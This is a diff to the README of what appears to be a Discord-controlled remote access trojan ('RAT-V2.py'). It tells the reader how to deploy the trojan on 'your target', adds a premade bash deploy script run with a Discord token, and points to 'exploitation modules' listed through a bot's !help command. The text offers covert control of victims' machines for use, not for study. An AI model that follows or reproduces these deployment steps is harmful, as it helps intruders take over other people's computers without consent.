@@ -48,6 +48,14 @@ Heres how to deploy on your target.
 
 Now if you have access to your targets terminal output of `RAT-V2.py` you should see this when the program has started: `Logged in as: Your bot`
 
+### Other ways to deploy
+
+The previous steps are the original way too deploy which you can use to package in your payload.
+But i have also made a premade payloads to deliver it with just a file / command.  
+I will make more in the future.
+
+[Bash command](Deploy-script-bash.sh) Run this with your discord token as the command argument, like this: `bash Deploy-script-bash.sh discord-token`
+
 ## Usage
 
 In the discord server you invited your bot to you can access the help menu which lists all exploitation modules with `!help`
